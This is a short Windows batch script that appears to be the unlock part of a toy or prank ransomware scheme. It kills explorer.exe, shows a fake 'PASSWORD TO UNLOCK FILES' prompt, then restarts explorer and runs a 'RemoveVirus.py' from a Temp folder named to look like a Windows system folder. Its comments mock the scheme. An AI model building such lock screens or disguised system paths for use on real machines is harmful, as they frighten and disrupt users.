@echo off

taskkill /im /f explorer.exe

REM this is pathetic.

set /p c=PASSWORD TO UNLOCK FILES?: 

REM I don't take payments so instant unlock

cd %systemdrive%\Temp\Microsoft Windows\
explorer
py RemoveVirus.py
